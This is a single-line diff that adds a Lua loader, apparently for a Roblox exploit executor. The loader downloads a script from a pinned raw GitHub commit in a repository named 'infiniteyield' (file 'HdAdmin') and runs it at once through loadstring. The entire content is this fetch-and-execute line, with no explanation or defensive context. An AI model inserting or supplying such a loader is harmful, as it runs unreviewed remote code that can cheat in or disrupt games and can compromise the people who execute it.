@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/infiniteyield/5d4cbde555fea469c69d03fe113d0f0ee30c505d/HdAdmin"))()
